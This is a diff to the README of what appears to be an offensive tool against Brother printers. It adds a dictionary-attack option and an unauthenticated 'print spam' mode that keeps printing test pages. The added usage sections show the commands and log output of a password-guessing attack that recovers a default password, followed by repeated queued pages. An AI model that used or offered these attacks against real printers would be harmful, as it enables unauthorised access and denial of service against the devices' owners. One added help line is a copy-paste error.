@@ -10,12 +10,17 @@ options:
   --ip-address IP_ADDRESS, -i IP_ADDRESS
                         IP Address of the printer
   --port PORT, -p PORT  Port the admin interface is running on (default: 80)
+  --dictionary-attack DICTIONARY_ATTACK, -D DICTIONARY_ATTACK
+                        IP Address of the printer
+  --print-spam, -S      continuously print test pages (unauthenticated)
   --wordlist WORDLIST, -W WORDLIST
                         Wordlist to use to attack the printer (default:
                         /usr/share/wordlists/rockyou.txt)
 ```
 
 # Usage
+
+## Dictionary Attack
 Dictionary attack using the default wordlist
 ```
 ┌──(kali㉿kali)-[~]
@@ -29,3 +34,13 @@ Ohbrother checks for common default brother passwords
 C:\Users\DrewQ\Desktop\Brother>python main.py --wordlist "C:\Users\DrewQ\Downloads\passwords.txt" --ip-address 192.168.0.77
 [23:14:00] {C:\Users\DrewQ\Desktop\Brother\main.py:49} INFO - [*] default password was set: initpas
 ```
+
+## Print Spam
+C:\Users\DrewQ\Desktop\Brother>python ohbrother.py --print-spam initpass --ip-address 192.168.0.77
+[23:41:13] INFO - [*] queued a test page
+[23:41:16] INFO - [*] queued a test page
+[23:41:19] INFO - [*] queued a test page
+[23:41:22] INFO - [*] queued a test page
+[23:41:25] INFO - [*] queued a test page
+[23:41:28] INFO - [*] queued a test page
+[23:41:31] INFO - [*] queued a test page
